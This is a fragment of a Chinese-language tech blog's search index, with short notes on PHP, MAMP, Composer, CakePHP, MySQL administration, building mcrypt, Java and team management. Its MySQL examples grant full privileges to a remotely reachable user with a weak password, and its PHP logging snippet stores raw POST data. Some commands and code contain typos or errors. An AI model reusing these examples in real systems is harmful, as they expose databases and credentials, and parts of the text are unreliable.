title="进入交互模式"></a>进入交互模式</h2><p>linux上你只需要在命令行中输入 Python 命令即可启动交互式编程</p>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Mac 环境下使用MAMP安装PHP环境</title>
      <link href="/php/php/php-mamp/"/>
      <url>/php/php/php-mamp/</url>
      
        <content type="html"><![CDATA[<p>下载安装MAMP</p><p><a href="https://www.mamp.info/en/mamp-pro/" target="_blank" rel="noopener">https://www.mamp.info/en/mamp-pro/</a></p><p>设置默认的PHP为MAMP</p><blockquote><p>export PATH=”/Applications/MAMP/bin/php/php5.5.38/bin:$PATH”</p></blockquote><p>另一种方法更为简便,为MAMP的PHP设置一个别名即可</p><blockquote><p>alias phpmamp=/Applications/MAMP/bin/php/php5.5.38/bin/php</p></blockquote><p>破解安装更多版本的PHP</p><p>MAMP PRO 提供了更多的PHP版本选择,但是MAMP只提供了2个,实际上在MAMP安装目录下有多个PHP版本我们可以删除一些无用的PHP版本即可。</p>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>PHP 包管理工具</title>
      <link href="/php/php/PHP-package%20manager/"/>
      <url>/php/php/PHP-package%20manager/</url>
      
        <content type="html"><![CDATA[<p>PHP中可以使用的包管理工具为 composer<br>官网:<a href="https://getcomposer.org" target="_blank" rel="noopener">https://getcomposer.org</a></p><p>安装:<a href="https://getcomposer.org/download/" target="_blank" rel="noopener">https://getcomposer.org/download/</a></p><p>安装composer</p><blockquote><p>php -r “copy(‘<a href="https://getcomposer.org/installer&#39;" target="_blank" rel="noopener">https://getcomposer.org/installer&#39;</a>, ‘composer-setup.php’);”</p></blockquote><blockquote><p>php -r “if (hash_file(‘SHA384’, ‘composer-setup.php’) === ‘669656bab3166a7aff8a7506b8cb2d1c292f042046c5a994c43155c0be6190fa0355160742ab2e1c88d40d5be660b410’) { echo ‘Installer verified’; } else { echo ‘Installer corrupt’; unlink(‘composer-setup.php’); } echo PHP_EOL;”</p></blockquote><blockquote><p>php composer-setup.php</p></blockquote><blockquote><p>php -r “unlink(‘composer-setup.php’);”</p></blockquote><p>浏览PHP包:</p><p><a href="http://packagist.org" target="_blank" rel="noopener">http://packagist.org</a></p><p>使用composer</p><p>在工作目录下添加composer.json</p><pre><code>{    &quot;name&quot;: &quot;cakephp-boilerplate&quot;,    &quot;require&quot;: {        &quot;cakephp/cakephp&quot;: &quot;2.9.*&quot;    },    &quot;config&quot;: {        &quot;vendor-dir&quot;: &quot;Vendor/&quot;    }}</code></pre><blockquote><p>php composer.phar install</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>CakePHP 脚手架和命令行工具</title>
      <link href="/php/php/cakephp%20scaffold/"/>
      <url>/php/php/cakephp%20scaffold/</url>
      
        <content type="html"><![CDATA[<p>CakePHP提供了一个bake命令行工具,提供了一套代码创建命令行工具,可以根据数据库创建模型和控制器视图等。</p>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>CakePHP 资源收集</title>
      <link href="/php/php/cakephp%20resource/"/>
      <url>/php/php/cakephp%20resource/</url>
      
        <content type="html"><![CDATA[<p>akePHP is a rapid development framework for PHP which uses commonly known design patterns like Active Record, Association Data Mapping, Front Controller and MVC. Our primary goal is to provide a structured framework that enables PHP users at all levels to rapidly develop robust web applications, without any loss to flexibility.</p><p>The Cake Software Foundation - promoting development related to CakePHP<br><a href="http://cakefoundation.org/" target="_blank" rel="noopener">http://cakefoundation.org/</a></p><p>CakePHP - the rapid development PHP framework<br><a href="http://www.cakephp.org" target="_blank" rel="noopener">http://www.cakephp.org</a></p><p>Cookbook - user documentation for learning about CakePHP<br><a href="http://book.cakephp.org" target="_blank" rel="noopener">http://book.cakephp.org</a></p><p>API - quick reference to CakePHP<br><a href="http://api.cakephp.org" target="_blank" rel="noopener">http://api.cakephp.org</a></p><p>The Bakery - everything CakePHP<br><a href="http://bakery.cakephp.org" target="_blank" rel="noopener">http://bakery.cakephp.org</a></p><p>The Show - live and archived podcasts about CakePHP and more<br><a href="http://live.cakephp.org" target="_blank" rel="noopener">http://live.cakephp.org</a></p><p>CakePHP TV - screen casts from events and video tutorials<br><a href="http://tv.cakephp.org" target="_blank" rel="noopener">http://tv.cakephp.org</a></p><p>CakePHP Google Group - community mailing list and forum<br><a href="http://groups.google.com/group/cake-php" target="_blank" rel="noopener">http://groups.google.com/group/cake-php</a></p><p>#cakephp on irc.freenode.net - chat with CakePHP developers<br>irc://irc.freenode.net/cakephp</p>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>PHP 不同场景下技术选型的讨论</title>
      <link href="/php/php/lightweight%20php%20api/"/>
      <url>/php/php/lightweight%20php%20api/</url>
      
        <content type="html"><![CDATA[<h2 id="构建独立的API应用"><a href="#构建独立的API应用" class="headerlink" title="构建独立的API应用"></a>构建独立的API应用</h2><p>不使用框架而搭建轻量级灵活的API接口，满足基本业务需求要求拓展性好。</p><h3 id="技术选型"><a href="#技术选型" class="headerlink" title="技术选型"></a>技术选型</h3><ul><li>Composer 包管理工具</li><li>ToroPHP PHP路由框架</li><li>Medoo PHP数据库ORM框架</li><li>Monolog 日志框架</li><li>JWT token消费和验证</li></ul><h2 id="构建小型企业网站"><a href="#构建小型企业网站" class="headerlink" title="构建小型企业网站"></a>构建小型企业网站</h2><p>推荐使用 <a href="http://www.x6cms.com/" target="_blank" rel="noopener">x6cms</a> 这个cms的好处是构建了一个非常简单和完善的管理系统，该cms使用了CI框架开发</p><h2 id="构建微信应用"><a href="#构建微信应用" class="headerlink" title="构建微信应用"></a>构建微信应用</h2><p>推荐使用微擎，phpWechat</p>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>PHP环境 in Mac</title>
      <link href="/php/php/php-environment-in-mac/"/>
      <url>/php/php/php-environment-in-mac/</url>
      
        <content type="html"><![CDATA[<p>实际上Mac系统自带了PHP和Apache的开发环境</p><p>1、Apache相关</p><p>Mac系统自带apache服务器，我们只需要配置相关信息并进行开启服务即可</p><p>sudo vim /etc/apache2/httpd.conf</p><p>打开对PHP的支持,第169行左右</p><p>LoadModule php5_module libexec/apache2/libphp5.so</p><p>2、测试</p><p>系统默认会访问／Library/WebServer/Document/index.html.en文件</p><p>为了方便测试，在此目录下新建一个test.php文件，并输入</p><pre><code class="php">&lt;?phpphpinfo(); ?&gt;</code></pre><p>然后访问localhost/test.php，会直接打印出phpinfo中的各种信息</p><p>3、PHP配置</p><p>在做第二步测试的时候，扩展里面date会出现错误，原因是默认php.ini没有对date.timezone进行设置，系统默认UTC的时区，所以我们要开启对php.ini的设置</p><p>sudo cp /etc/php.ini.default php.ini</p><p>先把默认配置文件复制一份，然后给复制好的配置文件增加写的权限</p><p>sudo chmod +w php.ini</p><p>找到date.timezone，先把默认的注释给删除掉，然后直接后面配置成PRC即可</p><p>4、测试</p><p>再次访问localhost/test.php，date扩展就OK了！</p><p>使用自带的Apache</p><p>sudo apachectl start</p><p>sudo apachectl stop</p><p>sudo apachectl restart</p>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Ubuntu上的MySQL安装</title>
      <link href="/mysql/mysql/mysql-configuration/"/>
      <url>/mysql/mysql/mysql-configuration/</url>
      
        <content type="html"><![CDATA[<h2 id="首先检查系统中是否已经安装了MySQL"><a href="#首先检查系统中是否已经安装了MySQL" class="headerlink" title="首先检查系统中是否已经安装了MySQL"></a>首先检查系统中是否已经安装了MySQL</h2><p>在终端里面输入 sudo netstat -tap | grep mysql</p><p>若没有反映，没有显示已安装结果，则没有安装。若如下显示，则表示已经安装</p><h2 id="如果没有安装，则安装MySQL"><a href="#如果没有安装，则安装MySQL" class="headerlink" title="如果没有安装，则安装MySQL."></a>如果没有安装，则安装MySQL.</h2><p>在终端输入 sudo apt-get install mysql-server mysql-client</p><p>在此安装过程中会让你输入root用户(管理MySQL数据库用户，非Linux系统用户)密码，按照要求输入即可。如下所示：</p><h2 id="测试安装是否成功："><a href="#测试安装是否成功：" class="headerlink" title="测试安装是否成功："></a>测试安装是否成功：</h2><p>在终端输入 sudo netstat -tap | grep mysql</p><h2 id="也可通过登录MySQL测试"><a href="#也可通过登录MySQL测试" class="headerlink" title="也可通过登录MySQL测试"></a>也可通过登录MySQL测试</h2><p>在终端输入 mysql -uroot -p 接下来会提示你输入密码，输入正确密码，即可进入。如下所示：</p><h2 id="MySQL的一些简单管理："><a href="#MySQL的一些简单管理：" class="headerlink" title="MySQL的一些简单管理："></a>MySQL的一些简单管理：</h2><p>启动MySQL服务： ssudo /etc/init.d/mysql start</p><p>停止MySQL服务： sudo /etc/init.d/mysql stop</p><p>修改 MySQL 的管理员密码： sudo mysqladmin -u root password newpassword</p><p>设置远程访问(正常情况下，mysql占用的3306端口只是在IP 127.0.0.1上监听，拒绝了其他IP的访问（通过netstat可以查看到）。取消本地监</p><p>听需要修改 my.cnf 文件：)：</p><p>sudo vi /etc/mysql/mysql.conf.d/mysqld.cnf</p><p>bind-address = 127.0.0.1 //找到此内容并且注释</p><h2 id="MySQL安装后的目录结构分析-此结构只针对于使用apt-get-install-在线安装情况-："><a href="#MySQL安装后的目录结构分析-此结构只针对于使用apt-get-install-在线安装情况-：" class="headerlink" title="MySQL安装后的目录结构分析(此结构只针对于使用apt-get install 在线安装情况)："></a>MySQL安装后的目录结构分析(此结构只针对于使用apt-get install 在线安装情况)：</h2><p>数据库存放目录： /var/lib/mysql/</p><p>相关配置文件存放目录： /usr/share/mysql</p><p>相关命令存放目录： /usr/bin(mysqladmin mysqldump等命令)</p><p>启动脚步存放目录： /etc/rc.d/init.d/</p><h2 id="MySQL图形化管理软件"><a href="#MySQL图形化管理软件" class="headerlink" title="MySQL图形化管理软件"></a>MySQL图形化管理软件</h2><p>一般使用的有两个比较好，一个开源，一个商业收费：</p><p>开源：MySQL Workbench （具体使用介绍随着我的使用，我会慢慢总结）</p><p>商业：Navicat （收费的，有30天体验，之后我相信大家会有办法的）</p><h2 id="开启bin-log-日志"><a href="#开启bin-log-日志" class="headerlink" title="开启bin log 日志"></a>开启bin log 日志</h2>]]></content>
      
      
      <categories>
          
          <category> mysql </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>一段简单的PHP 日志代码</title>
      <link href="/php/php/simple-log-feature/"/>
      <url>/php/php/simple-log-feature/</url>
      
        <content type="html"><![CDATA[<pre><code class="php">&lt;?phpdefine(&quot;SEPARATOR&quot;,&quot; | &quot;);define(&quot;BASE_FILE_NAME&quot;,__DIR__.&quot;/../log/log.txt&quot;);file_put_contents(BASE_FILE_NAME,&quot;\n&quot;.date(&quot;Y-m-d h:i:s&quot;).    SEPARATOR.$_SERVER[&#39;PHP_SELF&#39;].SEPARATOR.    str_replace(&quot;\n&quot;,&quot;&quot;,json_encode($_POST) ),    FILE_APPEND);// 转存日志文件$currentDayFileName = __DIR__.&quot;/../log/&quot;.date(&quot;Y-m-d&quot;,time()-60*60*24).&quot;_log.txt&quot;;if(!file_exists($currentDayFileName)){    file_put_contents($currentDayFileName,file_get_contents(BASE_FILE_NAME));    file_put_contents(BASE_FILE_NAME,&quot;&quot;);}</code></pre>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>PHP拓展Linux/unix 下的编译安装</title>
      <link href="/php/php/PHP-extension/"/>
      <url>/php/php/PHP-extension/</url>
      
        <content type="html"><![CDATA[<p>在Linux下PHP如果出现了拓展不能被安装的情况时,需要自己安装拓展。</p><p>一般来说需要安装相应系统库:比如libmcrypt和相应的拓展.so文件,下面使用mycrypt作为例子</p><p>MCrypt是一个功能强大的加密算法扩展库，它包括有22种算法。</p><p>1:下载并解压mcrypt-2.6.8.tar.bz2。（2.6.8为版本号，可以自行选择，但是注意后边步骤要与下载的版本号一致。）<br>2:在终端执行命令（注意如下命令需要安装xcode支持）：</p><pre><code>cd ~/Downloads/mcrypt-2.5.8./configure --disable-posix-threads --enable-staticmakesudo make install</code></pre><p><em>实际上这一步在Ubuntu上可以使用 apt-get 工具安装,在Mac上使用homebrew安装</em></p><p>3：下载并解压php源码，根据自己情况选择对应版本。(注意以下命令中php的版本)<br>在终端执行命令：（如果出错请看后边）</p><pre><code>cd ~/Downloads/php-5.5.14/ext/mcryptphpize./configuremakecd modulessudo cp mcrypt.so /usr/lib/php/extensions/no-debug-non-zts-20121212///上面可以使用make install 代替</code></pre><p>（cd modules后当出现</p><p>Build complete.<br>Don’t forget to run ‘make test’.<br>表示安装成功。）</p><p>*</p><p>直接安装拓展<br><a href="https://stackoverflow.com/questions/24749950/error-no-available-formula-for-php54-mcrypt-on-mac-os-x-mavericks" target="_blank" rel="noopener">https://stackoverflow.com/questions/24749950/error-no-available-formula-for-php54-mcrypt-on-mac-os-x-mavericks</a></p><p>*</p><p>4：打开php.ini</p><pre><code>sudo vi /etc/php.ini</code></pre><p>添加如下代码：（注意no-debug-non-zts-20121212版本号，如果不清楚可以前往/usr/lib/php/extensions/查看）</p><p>extension=/usr/lib/php/extensions/no-debug-non-zts-20121212/mcrypt.so<br>*如果phpize出现如下错误：</p><p>grep: /usr/include/php/main/php.h: No such file or directory<br>grep: /usr/include/php/Zend/zend_modules.h: No such file or directory<br>grep: /usr/include/php/Zend/zend_extensions.h: No such file or directory<br>Configuring for:<br>PHP Api Version:<br>Zend Module Api No:<br>Zend Extension Api No:<br>Cannot find autoconf. Please check your autoconf installation and the<br>$PHP_AUTOCONF environment variable. Then, rerun this script.<br>表示需要安装autoconf</p><p>*如果make出现如下错误：</p><p>/ext/mcrypt/mcrypt.c:25:10: fatal error: ‘php.h’ file not found<br>执行如下命令即可：</p><pre><code>sudo ln -s /Applications/Xcode.app/Contents/Developer/Platforms/MacOSX.platform/Developer/SDKs/MacOSX10.10.sdk/usr/include /usr/include</code></pre><p><em>注意MacOSX10.10.sdk修改为自己系统的版本号</em></p><p>如果遇到<br>Configuring for:<br>PHP Api Version:         20121113<br>Zend Module Api No:      20121212<br>Zend Extension Api No:   220121212<br>Cannot find autoconf. Please check your autoconf installation and the<br>$PHP_AUTOCONF environment variable. Then, rerun this script.</p><p>参考:<a href="https://stackoverflow.com/questions/31583646/cannot-find-autoconf-please-check-your-autoconf-installation-xampp-in-centos" target="_blank" rel="noopener">https://stackoverflow.com/questions/31583646/cannot-find-autoconf-please-check-your-autoconf-installation-xampp-in-centos</a></p><p>For CentOS:</p><blockquote><h1 id="yum-install-autoconf"><a href="#yum-install-autoconf" class="headerlink" title="yum install autoconf"></a>yum install autoconf</h1></blockquote><p>for Ubuntu :</p><blockquote><h1 id="apt-get-install-autoconf"><a href="#apt-get-install-autoconf" class="headerlink" title="apt-get install autoconf"></a>apt-get install autoconf</h1></blockquote><p>for fedora 24-27:</p><blockquote><h1 id="dnf-install-autoconf"><a href="#dnf-install-autoconf" class="headerlink" title="dnf install autoconf"></a>dnf install autoconf</h1></blockquote><p>For Mac</p><blockquote><p>brew install autoconf</p></blockquote><p>对于Mac系统遇到 /etc/权限问题</p><p>参考:<a href="https://apple.stackexchange.com/questions/208815/error-configuring-mcrypt-after-upgrading-to-el-capitan" target="_blank" rel="noopener">https://apple.stackexchange.com/questions/208815/error-configuring-mcrypt-after-upgrading-to-el-capitan</a></p><p>我们可以安装到另外的地方</p><pre><code>sudo make EXTENSION_DIR=&#39;/usr/local/lib/php/extensions&#39; install</code></pre><h3 id="更多Mac的安全策略"><a href="#更多Mac的安全策略" class="headerlink" title="更多Mac的安全策略"></a>更多Mac的安全策略</h3><p>在最新的OSX中限制用户访问某些系统目录<br><a href="https://developer.apple.com/library/content/documentation/Security/Conceptual/System_Integrity_Protection_Guide/Introduction/Introduction.html" target="_blank" rel="noopener">https://developer.apple.com/library/content/documentation/Security/Conceptual/System_Integrity_Protection_Guide/Introduction/Introduction.html</a></p><p>无法访问的地址</p><pre><code>/bin/sbin/usr/System</code></pre><pre><code>/usr/local/Applications/Library~/Library</code></pre>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Mysql 基本管理命令</title>
      <link href="/mysql/mysql/mysql-baisc-operation/"/>
      <url>/mysql/mysql/mysql-baisc-operation/</url>
      
        <content type="html"><![CDATA[<p>一、从命令行登录MySQL数据库服务器 1、登录使用默认3306端口的MySQL</p><p>/usr/local/mysql/bin/mysql -u root -p</p><p>2、通过TCP连接管理不同端口的多个MySQL（注意：MySQL4.1以上版本才有此项功能）</p><p>/usr/local/mysql/bin/mysql -u root -p –protocol=tcp –host=localhost –port=3307</p><p>3、通过socket套接字管理不同端口的多个MySQL</p><p>/usr/local/mysql/bin/mysql -u root -p –socket=/tmp/mysql3307.sock</p><p>4、通过端口和IP管理不同端口的多个MySQL</p><p>/usr/local/mysql/bin/mysql -u root -p -P 3306 -h 127.0.0.1</p><hr><p>二、数据库操作SQL语句 1、显示服务器上当前存在什么数据库</p><p>SHOW DATABASES;</p><p>2、创建名称为rewin的数据库</p><p>CREATE DATABASE rewin DEFAULT CHARACTER SET utf8 ;</p><p>3、删除名称为rewin的数据库</p><p>DROP DATABASE rewin;</p><p>4、选择rewin数据库</p><p>USE rewin;</p><hr><p>三、表操作SQL语句（登录之后必须用以上的USE命令选择一个数据库，再进行表操作） 1、显示当前数据库中存在什么表</p><p>SHOW TABLES;</p><p>2、创建数据库表zhangyan：在mysql&gt;后粘贴以下SQL语句，存储引擎为MYISAM，字段id为主键、唯一索引</p><p>。</p><p>CREATE TABLE <code>zhangyan</code> ( <code>id</code> INT( 5 ) UNSIGNED NOT NULL AUTO_INCREMENT , <code>username</code> VARCHAR( 20 ) NOT NULL , <code>password</code> CHAR( 32 ) NOT NULL , <code>time</code> DATETIME NOT NULL , <code>number</code> FLOAT( 10 ) NOT NULL , <code>content</code> TEXT NOT NULL , PRIMARY KEY ( <code>id</code> ) ) ENGINE = MYISAM ;</p><p>3、查看zhangyan表结构</p><p>DESCRIBE zhangyan;</p><p>4、从表中检索信息 4.1、从zhangyan表中检索所有记录</p><p>SELECT * FROM zhangyan;</p><p>4.2、从zhangyan表中检索特定的行：字段username等于abc，字段number等于1，按字段id降序排列</p><p>SELECT * FROM zhangyan WHERE username = abc AND number=1 ORDER BY id DESC;</p><p>4.3、从zhangyan表中检索指定的字段：username和password</p><p>SELECT username, password FROM zhangyan;</p><p>4.4、从zhangyan表中检索出唯一的不重复记录：</p><p>SELECT DISTINCT username FROM zhangyan;</p><p>5、插入信息到zhangyan表</p><p>INSERT INTO zhangyan (id, username, password, time, number, content) VALUES (, abc, 123456,</p><p>2007-08-06 14:32:12, 23.41, hello world);</p><p>6、更新zhangyan表中的指定信息</p><p>UPDATE zhangyan SET content = hello china WHERE username = abc;</p><p>7、删除zhangyan表中的指定信息</p><p>DELETE FROM zhangyan WHERE id = 1;</p><p>8、清空zhangyan表</p><p>DELETE FROM zhangyan;</p><p>9、删除zhangyan表</p><p>DROP TABLE zhangyan;</p><p>10、更改表结构，将zhangyan表username字段的字段类型改为CHAR(25)</p><p>ALTER TABLE zhangyan CHANGE username username CHAR(25);</p><p>11、将当前目录下的mysql.sql导入数据库</p><p>SOURCE ./mysql.sql;</p><hr><p>四、数据库权限操作SQL语句 </p><p>1、创建一个具有root权限，可从任何IP登录的用户sina，密码为zhangyan</p><p>GRANT ALL PRIVILEGES ON <em>.</em> TO sina@% IDENTIFIED BY zhangyan;</p><p>2、创建一个具有”数据操作”、”结构操作”权限，只能从192.168.1.***登录的用户sina，密码为zhangyan</p><p>GRANT SELECT , INSERT , UPDATE , DELETE , FILE , CREATE , DROP , INDEX , ALTER , CREATE</p><p>TEMPORARY TABLES , CREATE VIEW , SHOW VIEW , CREATE ROUTINE, ALTER ROUTINE, EXECUTE ON</p><p><em>.</em> TO <a href="mailto:sina@192.168.1" target="_blank" rel="noopener">sina@192.168.1</a>.% IDENTIFIED BY zhangyan;</p><p>3、创建一个只拥有”数据操作”权限，只能从192.168.1.24登录，只能操作rewin数据库的zhangyan表的用户</p><p>sina，密码为zhangyan</p><p>GRANT SELECT , INSERT , UPDATE , DELETE ON  rewin.zhangyan TO <a href="mailto:sina@192.168.1.24" target="_blank" rel="noopener">sina@192.168.1.24</a> IDENTIFIED BY</p><p>zhangyan;</p><p>4、创建一个拥有”数据操作”、”结构操作”权限，可从任何IP登录，只能操作rewin数据库的用户sina，密码为</p><p>zhangyan</p><p>GRANT SELECT , INSERT , UPDATE , DELETE , CREATE , DROP , INDEX , ALTER , CREATE TEMPORARY</p><p>TABLES , CREATE VIEW , SHOW VIEW , CREATE ROUTINE, ALTER ROUTINE, EXECUTE ON rewin.* TO</p><p>sina@% IDENTIFIED BY zhangyan;</p><p>5、删除用户</p><p>DROP USER sina@%;</p><p>6.MySQL中将字符串aaa批量替换为bbb的SQL语句</p><p>UPDATE 表名 SET 字段名 = REPLACE (字段名, aaa, bbb);</p><p>7.修复损坏的表       ①、用root帐号从命令行登录MySQL： 　　     mysql -u root -p</p><p>　　②、输入root帐号的密码。</p><p>　　③、选定数据库名（本例中的数据库名为student）： 　　use student;</p><p>　　④、修复损坏的表（本例中要修复的表为smis_user_student）： 　　repair table smis_user_student;udent;</p>]]></content>
      
      
      <categories>
          
          <category> mysql </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Java web project 概览</title>
      <link href="/%E6%8A%80%E6%9C%AF%E6%9E%B6%E6%9E%84/architecture/java-project-structure/"/>
      <url>/%E6%8A%80%E6%9C%AF%E6%9E%B6%E6%9E%84/architecture/java-project-structure/</url>
      
        <content type="html"><![CDATA[<ol><li><p>Java 基础重点回顾</p><ul><li>注解</li><li>异常</li></ul></li><li><p>J2EE 开发常用版本</p><ul><li>Jar 引入Tomcat的J2EE的实现</li><li>J2EE 1.7</li><li>JDK 8</li><li>Tomcat 1.7</li></ul></li><li><p>Spring framework</p><ul><li>Beans</li><li>周边生态</li><li>项目配置 web.xml</li><li>页面渲染<ul><li>JSP</li><li>Velocity</li><li>FreeMaker</li><li>themleaf</li></ul></li></ul></li><li><p>ORM</p><ul><li>Mybatis<ul><li>DAO 接口<ol><li>DTO</li><li>PO</li></ol></li><li>Domain 或者 Model  实体类和数据库对应</li><li>Mapper 使用xml实现和数据库</li></ul></li><li>Hibernate</li><li>Querydsl ORM增强查询工具</li></ul></li><li><p>Validation</p><ul><li>Hibernate Validation 实现</li><li>Java EE Validation 实现</li></ul></li><li><p>授权验证/登录</p><ol><li>intercept 实现</li><li>sharon</li><li>Spring security</li></ol></li><li><p>部署</p><ol><li>tomcat 1.7</li></ol></li><li><p>日志</p><ol><li>log4J</li><li>self4J</li></ol></li><li><p>构建工具</p><ol><li>Maven</li><li>Gradle</li></ol></li><li><p>mapping 工具</p><ol><li>orika</li><li>object mapper</li></ol></li><li><p>其他工具库</p><ol><li>poi 微软文档API</li><li>guava Google工具库</li><li>commons-lang apache 字符串工具</li><li>quartz 计划任务</li></ol></li><li><p>Restful</p><ol><li>hateoas</li><li>jersey </li></ol></li></ol>]]></content>
      
      
      <categories>
          
          <category> 技术架构 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Team leader 能力模型案例解读</title>
      <link href="/management/management/Team%20leader%20checklist/"/>
      <url>/management/management/Team%20leader%20checklist/</url>
      
        <content type="html"><![CDATA[<ul><li>Develop others<ul><li>主动提出Feedbacks  </li></ul></li><li>Staffing<ul><li>熟悉团队成员构成，如果人员变化及时报告和安排人员</li><li>如果有新人或者毕业生，需要权衡是否会影响团队</li></ul></li><li>Team building<ul><li>增加亲密关系，让团队更加和谐、融洽</li><li>团队成员情绪和压力</li><li>Team的人员成长，注意人员搭配</li><li>提醒Timecard</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> management </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>DDI管理培训总结</title>
      <link href="/%E5%9B%A2%E9%98%9F%E7%AE%A1%E7%90%86/management/DDI%20training/"/>
      <url>/%E5%9B%A2%E9%98%9F%E7%AE%A1%E7%90%86/management/DDI%20training/</url>
      
        <content type="html"><![CDATA[<ul><li>角色认知<ul><li>角色认知模型</li><li>催化剂型的领导</li></ul></li><li><p>沟通</p><ul><li>常见沟通障碍<ul><li>认知偏差</li><li>听不到位</li><li>无效表达</li><li>缺乏参与</li></ul></li><li>破除沟通障碍<ul><li>听、说、问</li></ul></li><li>分派任务、获取承诺<ul><li>任务应该交给谁</li><li>分配任务时的挑战</li></ul></li></ul></li><li><p>辅导</p><ul><li>何为教练</li><li>诊断问题的四个阶段</li></ul></li><li>反馈<ul><li>高效发展</li><li>发展自我和他人</li><li>高效反馈</li></ul></li></ul><h2 id="管理者角色-沟通和任务分配"><a href="#管理者角色-沟通和任务分配" class="headerlink" title="管理者角色 - 沟通和任务分配"></a>管理者角色 - 沟通和任务分配</h2><ul><li><p>设定目标的SMART原则</p><ul><li>Specific 具体的</li><li>Measurable 可评估的</li><li>Attainable 可实现的</li><li>Relevant 相关联的</li><li>Time Bound 有时限的</li></ul></li><li><p>沟通的几个问题</p><ul><li>由于每个人的背景和环境差异，认知偏差是客观存在的，例如男、女基于性别的认知差异，不同职位的认知差异。</li><li>缺乏有效的聆听，不投入认真听，或者听得内容没有抓住重点</li><li>无效表达，内容啰嗦，没有说到重点</li><li>缺乏参与，不集中精神，不仅沟通无效而且非常不尊重人</li></ul></li><li><p>人际互动的两种需求</p><ul><li>个人需求，每个人需要在沟通中需要被理解、包容和支持，关注个人情绪而不是具体事务。</li><li>实际需求，希望通过沟通能解决的具体问题</li><li>寻求沟通的一方往往需求实际需求，而忽略了被沟通的一方首先需求的是个人需求和情感需要</li></ul></li><li><p>聆听的tips</p><ul><li>专注几种</li><li>理解确认</li><li>回应情绪</li></ul></li><li><p>同理心tips</p><ul><li><p>不该做的</p><ul><li>同理不是同意</li><li>同理不是给建议</li><li>不应该借此八卦、触及隐私</li><li>不应该比惨</li></ul></li><li><p>该做的</p><ul><li>回应</li><li>重述事实</li><li>表达感受</li></ul></li></ul></li><li><p>提问的技巧</p><ul><li>使用开放性问题收集信息</li><li>使用封闭性问题确认信息</li><li>一次一个问题</li><li>保持简单</li><li>更进问题</li><li>广泛到具体漏斗形提问</li></ul></li><li><p>说</p><ul><li>思考这件事对对方的好处</li><li>思考这件事是否损害对方利益</li><li>如果既没有好处，也没有利益损害，请使用请求的方式</li></ul></li><li><p>互动的流程</p><ul><li>定方向 - 表达目的和重要性</li><li>理情况 - 表达事实、数据、问题、疑惑</li><li>想方案 - 方向、资源、支持</li><li>明作法 - 提出Action</li><li><em>然后呢？</em> </li><li>做总结 - 重述要点、给予鼓励、支持和信心，比如随时欢迎来找我。</li></ul></li><li><p>分配任务</p><ul><li>考虑的维度<ul><li>成本</li><li>数量</li><li>时间</li><li>质量</li></ul></li><li>选择合适的人选<ul><li>客观条件</li><li>人员意愿</li></ul></li><li>人们只会做那些考察的而不是强调的</li></ul></li></ul><h2 id="辅导者的角色-高效辅导"><a href="#辅导者的角色-高效辅导" class="headerlink" title="辅导者的角色 - 高效辅导"></a>辅导者的角色 - 高效辅导</h2><ul><li><p>辅导之前准确发现问题</p><ul><li>评价一个人的陷阱<ul><li>过多假设</li><li>严苛效应</li><li>以偏概全</li><li>近期效应</li></ul></li></ul></li><li><p>观察的方法</p><ul><li>S/T Situation Task 情况、任务</li><li>行动 Action</li><li>结果 Results</li></ul></li><li><p>两种辅导</p><ul><li>改进型辅导，不好事情发生之后改进</li><li>发展型辅导，把做好的事情做得更好</li></ul></li></ul><h2 id="管理者的角色-发展和反馈"><a href="#管理者的角色-发展和反馈" class="headerlink" title="管理者的角色 - 发展和反馈"></a>管理者的角色 - 发展和反馈</h2><ul><li>怎样顺势而为<ul><li>个人目标</li><li>组织目标和需求</li><li>团队目标和需求</li></ul></li></ul><p>在这三种之间做出平衡，即可顺势而为g</p><ul><li>学习最有效的方式<ul><li>学习</li><li>评估和考核</li><li>应用</li></ul></li></ul><h2 id="其他启示"><a href="#其他启示" class="headerlink" title="其他启示"></a>其他启示</h2><ul><li>永远优先关注人的感受而不是工作的进展</li><li>做出选择的时候考虑失去什么，是否能承受的了。做出任何选择，得到的不一定能得到，失去的一定会失去。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 团队管理 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Java 对象克隆</title>
      <link href="/java/java/java-object-clone/"/>
      <url>/java/java/java-object-clone/</url>
      
        <content type="html"><![CDATA[<p>Java变量赋值对于简单变量来说没有什么特别的,对于对象来说有几种情况,</p><ul><li>shallow 赋值</li><li>深拷贝</li><li>克隆</li></ul><h4 id="shallow-赋值"><a href="#shallow-赋值" class="headerlink" title="shallow 赋值"></a>shallow 赋值</h4><p>这种赋值情况为共享内存空间,多个变量指向同一个地址空间</p><pre><code class="java">Object obj1 = new Object();Object obj2 = obj1;</code></pre><p>这里的obj1 和 obj2 共享内存空间, 修改其中一个会导致另外一个对象发生变化。</p><h4 id="深拷贝"><a href="#深拷贝" class="headerlink" title="深拷贝"></a>深拷贝</h4><p>递归复制对象中所有的成员变量</p><pre><code class="java">Object obj1 = new Object();obj1.a = 1;Object obj2 = new Object();obj2.a = obj1.a;</code></pre><h4 id="对象克隆"><a href="#对象克隆" class="headerlink" title="对象克隆"></a>对象克隆</h4><p>使用对象的clone方法</p><pre><code class="Java">Person p = new Person(23, &quot;zhang&quot;);Person p1 = (Person) p.clone();System.out.println(p);System.out.println(p1);</code></pre>]]></content>
      
      
